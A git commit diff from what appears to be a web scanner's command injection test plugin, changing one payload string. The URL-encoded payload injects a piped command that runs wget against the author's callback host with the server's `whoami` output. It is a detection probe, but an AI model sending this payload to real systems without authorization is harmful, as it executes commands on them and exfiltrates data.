1b7c7024f5977de49a7650725c9bf319df3f869f
guimaizi <635713319@qq.com>
2020-05-28 22:48:51 +0800

    guimaizi

--- attack_plugin/cmd_inj.py
+++ attack_plugin/cmd_inj.py
@@ -11,7 +11,8 @@ class cmd_inj:
     def __init__(self):
         '''命令注入测试'''
         self.config= config_function.config_function()
-        self.param_process= param_process.param_process(['XSSS1%20%7C%20wget%20http%3A%2F%2Ftest.guimaizi.com%2Fxssss12321321888888.php%3F%60whoami%60%20%7C%7C%20aaa'])
+        self.param_process= param_process.param_process([
+            'XSSS1%20%7C%20wget%20http%3A%2F%2Ftest.guimaizi.com%2F1.php%3F%60whoami%60%20%7C%7C%20aaa'])
         self.http_testing= http_testing.http_testing()
     def run(self,request_data):
         for target_list in self.param_process.main(request_data):
